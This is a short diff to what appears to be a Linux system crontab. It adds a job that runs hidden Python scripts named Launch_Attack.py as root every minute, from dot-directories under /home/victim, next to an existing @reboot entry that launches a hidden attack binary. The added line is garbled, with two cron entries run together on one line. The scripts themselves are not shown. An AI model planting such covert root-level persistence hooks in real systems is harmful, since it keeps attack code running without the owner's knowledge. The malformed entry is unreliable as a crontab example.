@@ -14,3 +14,4 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 @reboot root cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack
+* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py
